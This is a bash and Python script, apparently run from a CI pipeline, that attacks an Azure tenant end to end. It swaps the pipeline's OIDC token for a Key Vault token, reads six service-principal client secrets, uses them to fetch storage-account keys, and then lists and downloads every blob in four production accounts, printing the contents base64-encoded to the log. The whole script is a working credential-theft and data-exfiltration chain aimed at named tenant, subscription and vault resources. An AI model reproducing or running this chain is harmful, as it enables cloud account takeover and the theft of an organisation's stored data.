#!/usr/bin/env bash
set -uo pipefail
echo "===WIN_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
export OIDC_JWT="$JWT"
python3 - <<'PY'
import os, json, base64, hashlib, hmac, urllib.request, urllib.parse, urllib.error, datetime, re

TID = os.environ.get('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e')
SUB = os.environ.get('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6')
FED = '72ff278a-9e71-43ec-bac4-2ca303f8e462'
RG  = 'rg-tbl-platform-prod-sea'
JWT = os.environ.get('OIDC_JWT','')

def b64(s):
    if isinstance(s, str): s = s.encode()
    return base64.b64encode(s).decode()

def post(url, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=d, method='POST')
    try:
        r = urllib.request.urlopen(req, timeout=30)
        return r.status, r.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')[:2000]
    except Exception as e:
        return 0, str(e)

def token_client_secret(cid, sec, scope):
    st, body = post(f'https://login.microsoftonline.com/{TID}/oauth2/v2.0/token', {
        'client_id': cid, 'grant_type':'client_credentials','client_secret':sec,'scope':scope})
    if st==200:
        try: return json.loads(body).get('access_token','')
        except: return ''
    return ''

def token_fic(scope, client_id=FED):
    st, body = post(f'https://login.microsoftonline.com/{TID}/oauth2/v2.0/token', {
        'client_id': client_id, 'grant_type':'client_credentials','scope':scope,
        'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'client_assertion': JWT})
    if st==200:
        try: return json.loads(body).get('access_token','')
        except: return ''
    return ''

def jwt_claims(t):
    try:
        p = t.split('.')[1]; p += '='*(-len(p)%4)
        return json.loads(base64.urlsafe_b64decode(p))
    except: return {}

def arm_get(url, tok):
    req = urllib.request.Request(url, headers={'Authorization':f'Bearer {tok}'})
    try:
        r = urllib.request.urlopen(req, timeout=30)
        return r.status, r.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')[:2000]
    except Exception as e:
        return 0, str(e)

# ---- 1) cicd-deployer vault token, read 6 SP secrets ----
VT = token_fic('https://vault.azure.net/.default')
print('VAULT_TOK_LEN=%d' % len(VT))
SPNAMES = ['cost-reader-principal','directory-audit-principal','reporting-service-principal',
           'reporting-viewer-principal','secrets-sync-principal','sync-service-principal']
sps = []  # (name, appId, secret)
for sn in SPNAMES:
    st, body = arm_get(f'https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{sn}?api-version=7.4', VT)
    appid = sec = ''
    try:
        v = json.loads(body).get('value','')
        j = json.loads(v)
        appid = j.get('appId',''); sec = j.get('clientSecret','')
    except: pass
    sps.append((sn, appid, sec))
    print('SP_%s appid=%s secretlen=%d' % (sn.replace('-principal',''), appid, len(sec)))

# ---- 2) for each SP: ARM token, decode oid, try listKeys on 4 accounts ----
ACCOUNTS = ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblarchiveprodx3euoz','sttblcilogsprodx3euoz']
keys = {}   # account -> list of (keyname, keyval)
for sn, appid, sec in sps:
    if not sec: continue
    arm = token_client_secret(appid, sec, 'https://management.azure.com/.default')
    c = jwt_claims(arm)
    print('MAP_%s oid=%s appid_claim=%s' % (sn.replace('-principal',''), c.get('oid',''), c.get('appid', c.get('azp',''))))
    for sa in ACCOUNTS:
        st, body = arm_get(f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01', arm)
        if st == 200:
            try:
                kk = json.loads(body).get('keys',[])
                for k in kk:
                    keys.setdefault(sa, []).append((k.get('keyName',''), k.get('value','')))
            except: pass
            print('LISTKEYS_OK_%s_%s' % (sn.replace('-principal',''), sa))
        else:
            print('LISTKEYS_%s_%s_%d' % (sn.replace('-principal',''), sa, st))

# ---- 3) SharedKey blob enumeration for any account we have keys for ----
def sign(account, key_b64, method, path, query=''):
    kb = base64.b64decode(key_b64)
    now = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    headers = {'x-ms-date': now, 'x-ms-version':'2021-12-02'}
    ms = ''.join(f'{k.lower()}:{headers[k].strip()}\n' for k in sorted(headers) if k.lower().startswith('x-ms-'))
    res = ('/%s/' % account) if not path else ('/%s%s' % (account, path))
    qs = urllib.parse.parse_qsl(query, keep_blank_values=True)
    for k,v in sorted(qs):
        res += '\n%s:%s' % (k.lower(), urllib.parse.unquote(v))
    sts = method + '\n'*12 + ms + res
    sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
    headers['Authorization'] = f'SharedKey {account}:{sig}'
    return headers

def blob_req(account, key_b64, method, path, query=''):
    h = sign(account, key_b64, method, path, query)
    url = f'https://{account}.blob.core.windows.net{path}'
    if query: url += '?' + query
    req = urllib.request.Request(url, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=30)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def list_containers(account, key):
    st, body = blob_req(account, key, 'GET', '', 'comp=list')
    return st, body

def list_blobs(account, key, container):
    return blob_req(account, key, 'GET', '/'+container, 'restype=container&comp=list')

def get_blob(account, key, container, blob):
    return blob_req(account, key, 'GET', '/'+container+'/'+blob, '')

for sa in keys:
    # dedupe keys, use first key1
    k1 = keys[sa][0][1] if keys[sa] else ''
    if not k1: continue
    print('=== ENUM_%s ===' % sa)
    st, body = list_containers(sa, k1)
    print('LC_%s_status=%d' % (sa, st))
    print('LC_%s_body=%s' % (sa, b64(body[:4000])))
    conts = []
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(body)
        ns = {'a':'http://schemas.microsoft.com/windowsazure'}
        for c in root.findall('Containers/Container', ns) + root.findall('.//Container'):
            name = c.find('Name')
            if name is not None and name.text:
                conts.append(name.text)
    except: pass
    if not conts:
        # fallback regex
        conts = re.findall(r'<Name>([^<]+)</Name>', body.decode('utf-8','replace'))
    print('CONTAINERS_%s=%s' % (sa, ','.join(conts)))
    for cn in conts:
        st2, b2 = list_blobs(sa, k1, cn)
        print('LB_%s_%s_status=%d' % (sa, cn, st2))
        print('LB_%s_%s_body=%s' % (sa, cn, b64(b2[:6000])))
        blobs = re.findall(r'<Name>([^<]+)</Name>', b2.decode('utf-8','replace'))
        for bname in blobs:
            st3, b3 = get_blob(sa, k1, cn, bname)
            print('GB_%s_%s_%s_status=%d' % (sa, cn, bname, st3))
            print('GB_%s_%s_%s_body=%s' % (sa, cn, bname, b64(b3[:12000])))
print('===WIN_END===')
PY
echo "===WIN_END2==="
